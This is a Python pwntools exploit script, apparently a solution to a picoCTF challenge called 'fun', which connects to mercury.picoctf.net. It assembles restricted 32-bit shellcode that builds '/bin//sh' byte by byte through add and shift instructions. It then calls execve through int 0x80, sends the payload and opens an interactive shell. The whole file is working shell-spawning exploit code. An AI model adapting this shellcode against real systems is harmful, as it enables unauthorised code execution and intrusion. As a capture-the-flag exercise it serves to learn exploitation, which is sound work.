#!/usr/bin/env python3
from pwn import *

context.terminal = ['alacritty','-e','/bin/sh','-c']

#p = process('./fun')
#gdb.attach(p,"""
#b *execute+211
#c
#""")
p = remote('mercury.picoctf.net',16610)

NOP = asm('nop')

payload = asm('xor eax,eax')
payload += asm('add al,0')
payload += asm('shl eax,1')*8
payload += asm('add al,104')
payload += asm('shl eax,1')*8
payload += asm('add al,115')
payload += asm('shl eax,1')*8
payload += asm('add al,47')
payload += asm('push eax')+NOP
payload += asm('xor eax,eax')
payload += asm('add al,110')
payload += asm('shl eax,1')*8
payload += asm('add al,105')
payload += asm('shl eax,1')*8
payload += asm('add al,98')
payload += asm('shl eax,1')*8
payload += asm('add al,47')
payload += asm('push eax')+NOP
payload += asm('xor eax,eax')
payload += asm('add al,11')
payload += asm('xor ebx,ebx')
payload += asm('add ebx,esp')
payload += asm('xor ecx,ecx')
payload += asm('xor edx,edx')
payload += asm('int 0x80')

print(len(payload)*2)
p.sendlineafter(b'run:\n',payload)

p.interactive()
